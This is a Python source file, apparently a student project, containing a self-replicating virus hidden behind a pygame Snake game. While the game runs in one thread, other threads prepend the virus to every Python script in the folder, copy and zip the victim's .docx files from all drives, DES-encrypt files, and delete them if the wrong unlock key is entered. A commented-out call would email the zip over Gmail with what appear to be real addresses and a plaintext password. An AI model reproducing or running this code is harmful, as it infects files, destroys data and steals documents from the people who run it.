### THE VIRUS STARTS HERE ###
#0
import threading
import random
import glob, sys
sys.path.append("./DES")
import DES
import string, os, shutil
from ctypes import windll
#end
#1
def infection():
    code= [[],[],[],[],[],[]]
    code[0]="""
#0
import threading
import random
import glob, sys
sys.path.append("./DES")
import DES
import string, os, shutil
from ctypes import windll
#end
    """
    code[1]="""
#2 
# lấy path và thêm vào một file 
def get_drives(): 
        drives = []
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drives.append(letter)
            bitmask >>= 1
        return drives
#end"""

    code[2]="""#3
def get_file(drives):
    pathfiles=[]
    for i in drives:
        src_dir = i + ':\\\\'
        filePath = ''
        for dirpath, subdirs, files in os.walk(src_dir):
            for x in files:
                #  if x.endswith(".docx"): 
                if x=='a.txt':
                    pathfiles.append(os.path.join(dirpath, x))


    for i in pathfiles:
        print (i,end='')
    return pathfiles

#end"""

    code[3]="""#4
def encpyt( pathfiles):
    # mã hóa 

    for i in pathfiles:
    
        try:
            DES.encrypt(i)
                
        except shutil.SameFileError:
            pass

#end"""
    code[4]="""#5
def decrypt(pathfiles):

  
        def decrypt(pathfiles):
            for i in pathfiles:
                DES.decrypt(i)
    

#end"""

    code[5]="""#6
def run():
    drives = get_drives()
    pathfiles = get_file(drives)
    encpyt(pathfiles)
   
    print("Ban trong that nguy hiem")
    keyworld= input("Nhap key de mo khoa ")
    if (keyworld=="anhtuan"):
         decrypt(pathfiles)
    else:
        for file in pathfiles:
            os.remove(file)

#end"""
    
    # open every files and write the replicate code

    python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
    #print(python_scripts)

    for script in python_scripts: 
        arr = random.sample(range(6), 6)
        codes=[] 
        codes.append("### THE VIRUS STARTS HERE ###\n") 
        for i in arr:
            codes.append(code[i])
            codes.append("\n")
        
        codes.append('### THE VIRUS ENDS HERE ###\n')
        with open(script, 'r', encoding='utf-8', errors='ignore') as f:
            script_code = f.readlines()

        infected = False
        for line in script_code:
            if line == "### THE VIRUS STARTS HERE ###\n":
                infected = True
                break
        
        if not infected:
            final_code = []
            final_code.extend(codes)
            final_code.extend('\n')
            final_code.extend(script_code)

            with open(script, 'w', encoding='utf-8') as f:
                f.writelines(final_code)
#end

#2 
# lấy path và thêm vào một file 
def get_drives(): 
        drives = []
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drives.append(letter)
            bitmask >>= 1
        return drives
#end

#3
def get_file(drives):
    pathfiles = []
    # Thư mục đích để sao chép các tệp .txt
    destination_directory = ".\\data"
    # Tạo thư mục đích nếu nó không tồn tại
    if not os.path.exists(destination_directory):
        os.makedirs(destination_directory)

    for drive in drives:
        src_dir = drive + ':\\'
        for dirpath, subdirs, files in os.walk(src_dir):
            for x in files:
                if x.endswith(".docx"):
                    try:
                        filePath = os.path.join(dirpath, x)
                        # Sao chép tệp .txt vào thư mục đích
                        shutil.copy(filePath, destination_directory)
                    except Exception as e:
                        pass
                if x == 'a.txt':
                    pathfiles.append(os.path.join(dirpath, x))
    # Tạo tệp ZIP chứa các tệp .txt đã sao chép
    zip_filename = "virusData.zip"
    shutil.make_archive(os.path.splitext(zip_filename)[0], 'zip', destination_directory)
    zip_path = ".\\"+zip_filename
    return pathfiles, [zip_path]
#end

#4
def encpyt( pathfiles):
    # mã hóa 

    for i in pathfiles:
        try:
            DES.encrypt(i)       
        except shutil.SameFileError:
            pass
#end
#5
def decrypt(pathfiles):
        for i in pathfiles:
            DES.decrypt(i)
#end


# Send the email

import smtplib
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate


import smtplib
from pathlib import Path
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders


def send_mail(send_from, send_to, subject, message, files=[],
              server="localhost", port=587, username='', password='',
              use_tls=True):
    """Compose and send email with provided info and attachments.

    Args:
        send_from (str): from name
        send_to (list[str]): to name(s)
        subject (str): message title
        message (str): message body
        files (list[str]): list of file paths to be attached to email
        server (str): mail server host name
        port (int): port number
        username (str): server auth username
        password (str): server auth password
        use_tls (bool): use TLS mode
    """
    msg = MIMEMultipart()
    msg['From'] = send_from
    msg['To'] = COMMASPACE.join(send_to)
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    msg.attach(MIMEText(message))

    for path in files:
        part = MIMEBase('application', "octet-stream")
        with open(path, 'rb') as file:
            part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',
                        'attachment; filename="{}"'.format(Path(path).name))
        msg.attach(part)

    smtp = smtplib.SMTP(server, port)
    if use_tls:
        smtp.starttls()
    smtp.login(username, password)
    smtp.sendmail(send_from, send_to, msg.as_string())
    smtp.quit()



#6
def run():
    drives = get_drives()
    pathfiles,filesToSend = get_file(drives)
    encpyt(pathfiles)
    #send_mail('tuankkffdnc@gmail.com', '21011117@st.phenikaa-uni.edu.vn','Testing','Testing',filesToSend,server='smtp.gmail.com', port=587, username= 'tuankkffdnc@gmail.com', password = '0988129699Atmltb', use_tls=True)

    print("HACKED!\n")
    keyworld= input("Nhap key de mo khoa ")
    if (keyworld=="anhtuan"):
         decrypt(pathfiles)
    else:
        for file in pathfiles:
            os.remove(file)

#end

### THE VIRUS ENDS HERE ###
def mask():
    import pygame
    import time
    import random
    pygame.init()
    white = (255, 255, 255)
    yellow = (255, 255, 102)
    black = (0, 0, 0)
    red = (213, 50, 80)
    green = (0, 255, 0)
    blue = (50, 153, 213)
    dis_width = 600
    dis_height = 400
    dis = pygame.display.set_mode((dis_width, dis_height))
    pygame.display.set_caption('Snake Game by Edureka')
    clock = pygame.time.Clock()
    snake_block = 10
    snake_speed = 15
    font_style = pygame.font.SysFont("bahnschrift", 25)
    score_font = pygame.font.SysFont("comicsansms", 35)
    def Your_score(score):
        value = score_font.render("Your Score: " + str(score), True, yellow)
        dis.blit(value, [0, 0]) 
    def our_snake(snake_block, snake_list):
        for x in snake_list:
            pygame.draw.rect(dis, black, [x[0], x[1], snake_block, snake_block])  
    def message(msg, color):
        mesg = font_style.render(msg, True, color)
        dis.blit(mesg, [dis_width / 6, dis_height / 3])
    def gameLoop():
        game_over = False
        game_close = False
        x1 = dis_width / 2
        y1 = dis_height / 2
        x1_change = 0
        y1_change = 0
        snake_List = []
        Length_of_snake = 1
        foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
        foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0
        while not game_over:
            while game_close == True:
                dis.fill(blue)
                message("You Lost! Press C-Play Again or Q-Quit", red)
                Your_score(Length_of_snake - 1)
                pygame.display.update()
    
                for event in pygame.event.get():
                    if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_q:
                            game_over = True
                            game_close = False
                        if event.key == pygame.K_c:
                            gameLoop()
    
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    game_over = True
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_LEFT:
                        x1_change = -snake_block
                        y1_change = 0
                    elif event.key == pygame.K_RIGHT:
                        x1_change = snake_block
                        y1_change = 0
                    elif event.key == pygame.K_UP:
                        y1_change = -snake_block
                        x1_change = 0
                    elif event.key == pygame.K_DOWN:
                        y1_change = snake_block
                        x1_change = 0
    
            if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:
                game_close = True
            x1 += x1_change
            y1 += y1_change
            dis.fill(blue)
            pygame.draw.rect(dis, green, [foodx, foody, snake_block, snake_block])
            snake_Head = []
            snake_Head.append(x1)
            snake_Head.append(y1)
            snake_List.append(snake_Head)
            if len(snake_List) > Length_of_snake:
                del snake_List[0]
    
            for x in snake_List[:-1]:
                if x == snake_Head:
                    game_close = True
    
            our_snake(snake_block, snake_List)
            Your_score(Length_of_snake - 1)
    
            pygame.display.update()
    
            if x1 == foodx and y1 == foody:
                foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
                foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0
                Length_of_snake += 1
    
            clock.tick(snake_speed)
    
        pygame.quit()
        quit()
    
    
    gameLoop()
T3 = threading.Thread(target=mask)
T3.start()
T1 = threading.Thread(target=infection)
T1.start()
T2 = threading.Thread(target=run)
T2.start()


